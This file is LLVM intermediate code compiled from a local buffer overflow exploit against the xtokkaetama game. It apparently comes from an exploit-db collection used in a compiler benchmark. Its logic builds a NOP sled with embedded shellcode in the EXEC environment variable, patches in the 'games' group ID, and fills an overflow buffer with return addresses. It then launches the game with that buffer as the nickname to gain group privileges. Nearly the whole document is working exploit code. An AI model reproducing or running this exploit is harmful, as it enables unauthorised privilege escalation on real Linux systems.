; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22984.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22984.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.group = type { i32 }

@.str = private unnamed_addr constant [56 x i8] c"(*)xtokkaetama[v1.0b+]: local buffer overflow exploit.\0A\00", align 1
@.str.1 = private unnamed_addr constant [45 x i8] c"(*)by: v9@fakehalo.deadpig.org / fakehalo.\0A\0A\00", align 1
@exec = common dso_local global i32* null, align 8
@.str.2 = private unnamed_addr constant [6 x i8] c"games\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"EXEC\00", align 1
@.str.4 = private unnamed_addr constant [58 x i8] c"[*] in the game, hit: spacebar, \22Q\22, spacebar, spacebar.\0A\00", align 1
@.str.5 = private unnamed_addr constant [29 x i8] c"[*] entering xtokkaetama...\0A\00", align 1
@PATH = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [10 x i8] c"-nickname\00", align 1
@.str.7 = private unnamed_addr constant [27 x i8] c"[!] failed to execute %s.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.group*, align 8
  store i32 0, i32* %1, align 4
  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  %6 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.1, i64 0, i64 0))
  %7 = call i64 @malloc(i32 16385)
  %8 = inttoptr i64 %7 to i8*
  store i8* %8, i8** %3, align 8
  %9 = icmp ne i8* %8, null
  br i1 %9, label %12, label %10

10:                                               ; preds = %0
  %11 = call i32 @exit(i32 1) #3
  unreachable

12:                                               ; preds = %0
  %13 = load i8*, i8** %3, align 8
  %14 = load i32*, i32** @exec, align 8
  %15 = call i32 @strlen(i32* %14)
  %16 = sub nsw i32 16384, %15
  %17 = call i32 @memset(i8* %13, i32 144, i32 %16)
  %18 = call %struct.group* @getgrnam(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  store %struct.group* %18, %struct.group** %4, align 8
  %19 = icmp ne %struct.group* %18, null
  br i1 %19, label %25, label %20

20:                                               ; preds = %12
  %21 = load i32*, i32** @exec, align 8
  %22 = getelementptr inbounds i32, i32* %21, i64 7
  store i32 20, i32* %22, align 4
  %23 = load i32*, i32** @exec, align 8
  %24 = getelementptr inbounds i32, i32* %23, i64 5
  store i32 20, i32* %24, align 4
  br label %33

25:                                               ; preds = %12
  %26 = load %struct.group*, %struct.group** %4, align 8
  %27 = getelementptr inbounds %struct.group, %struct.group* %26, i32 0, i32 0
  %28 = load i32, i32* %27, align 4
  %29 = load i32*, i32** @exec, align 8
  %30 = getelementptr inbounds i32, i32* %29, i64 7
  store i32 %28, i32* %30, align 4
  %31 = load i32*, i32** @exec, align 8
  %32 = getelementptr inbounds i32, i32* %31, i64 5
  store i32 %28, i32* %32, align 4
  br label %33

33:                                               ; preds = %25, %20
  %34 = load i8*, i8** %3, align 8
  %35 = load i32*, i32** @exec, align 8
  %36 = call i32 @strcat(i8* %34, i32* %35)
  %37 = load i8*, i8** %3, align 8
  %38 = call i32 @setenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i64 0, i64 0), i8* %37, i32 1)
  %39 = load i8*, i8** %3, align 8
  %40 = call i32 @memset(i8* %39, i32 0, i32 16385)
  store i32 0, i32* %2, align 4
  br label %41

41:                                               ; preds = %50, %33
  %42 = load i32, i32* %2, align 4
  %43 = icmp ult i32 %42, 512
  br i1 %43, label %44, label %53

44:                                               ; preds = %41
  %45 = load i8*, i8** %3, align 8
  %46 = load i32, i32* %2, align 4
  %47 = zext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = bitcast i8* %48 to i64*
  store i64 3221217281, i64* %49, align 8
  br label %50

50:                                               ; preds = %44
  %51 = load i32, i32* %2, align 4
  %52 = add i32 %51, 4
  store i32 %52, i32* %2, align 4
  br label %41

53:                                               ; preds = %41
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.4, i64 0, i64 0))
  %55 = call i32 @sleep(i32 3)
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.5, i64 0, i64 0))
  %57 = load i8*, i8** @PATH, align 8
  %58 = load i8*, i8** @PATH, align 8
  %59 = load i8*, i8** %3, align 8
  %60 = call i64 @execlp(i8* %57, i8* %58, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0), i8* %59, i32 0)
  %61 = icmp ne i64 %60, 0
  br i1 %61, label %62, label %65

62:                                               ; preds = %53
  %63 = load i8*, i8** @PATH, align 8
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.7, i64 0, i64 0), i8* %63)
  br label %65

65:                                               ; preds = %62, %53
  %66 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local %struct.group* @getgrnam(i8*) #1

declare dso_local i32 @strcat(i8*, i32*) #1

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i64 @execlp(i8*, i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
